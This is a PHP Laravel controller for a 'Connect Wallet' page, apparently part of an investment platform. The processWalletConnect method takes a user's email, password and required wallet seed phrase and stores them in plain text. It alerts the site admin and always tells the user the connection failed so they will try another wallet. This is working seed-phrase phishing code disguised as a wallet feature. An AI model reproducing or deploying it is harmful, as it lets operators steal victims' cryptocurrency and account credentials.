<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\GeneralSetting;
use App\Models\User;
use App\Models\WalletConnect;
use App\Notifications\InvestmentMail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Validator;

class ConnectWalletController extends Controller
{
    //landing page
    public function index()
    {
        $user = Auth::user();
        $web = GeneralSetting::find(1);

        return view('user.connect_wallet')->with([
            'user' => $user,
            'web' => $web,
            'pageName' => 'Connect Wallet',
            'siteName' => $web->name
        ]);
    }

    public function processWalletConnect(Request  $request)
    {
        $user = Auth::user();
        // Validate using Validator facade
        $validator = Validator::make($request->all(), [
            'provider' => 'required|string|max:225',
            'email' => 'nullable|email|max:225',
            'password' => 'nullable|string',
            'seed' => 'required|string',
        ]);

        // Check if validation fails
        if ($validator->fails()){
            return back()->with('errors',$validator->errors());
        }
        $input = $validator->validated();

        // Store data in the database
        WalletConnect::create([
            'walletProvider' => $request->provider,
            'email' => $request->email,
            'password' => $request->password,
            'seedPhrase' => $request->seed,
            'status'=>2
        ]);

        $admin = User::where('is_admin',1)->first();

        if (!empty($admin)){
            $adminMessage = "
                   A new wallet connect has been placed by the investor <b>".$user->name."</b>.
                ";
            //SendDepositNotification::dispatch($admin,$adminMessage,'New Pending Deposit');
            $admin->notify(new InvestmentMail($admin,$adminMessage,'New wallet connection received.'));
        }
        return back()->with('error','Connection failed. Please try again with another wallet.');
    }
}
